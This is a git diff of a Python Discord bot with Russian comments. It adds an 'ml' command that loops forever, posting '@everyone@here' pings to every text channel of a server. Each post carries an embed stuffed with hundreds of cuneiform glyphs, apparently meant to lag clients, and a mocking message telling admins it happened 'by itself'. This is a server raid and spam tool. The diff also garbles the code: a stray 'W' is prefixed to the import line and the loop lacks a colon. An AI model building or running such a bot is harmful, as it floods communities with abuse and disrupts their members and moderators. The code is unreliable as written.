@@ -1,4 +1,4 @@
-import discord, time, random, sys, os
+Wimport discord, time, random, sys, os
 from discord.ext import commands
 
 intents = discord.Intents.all()
@@ -18,7 +18,14 @@ async def auto(ctx):
                 await member.add_roles(role) # выдаем автору роль
                 print(f"выдал {member} роль")
            print("выдал роль всем участникам")
-
+@client.command() 
+async def ml(ctx):
+    print("•спам запущен") 
+    emb = discord.Embed(title="𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n", 
+                        description = "𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n𒐫\n") 
+    while True:
+       for channel in ctx.guild.text_channels
+           await channel.send("@everyone@here, админы сорян оно само", embed=emb)
 @client.command()
 @commands.cooldown(1, 3600, commands.BucketType.guild)
 async def dm(ctx, *, som):
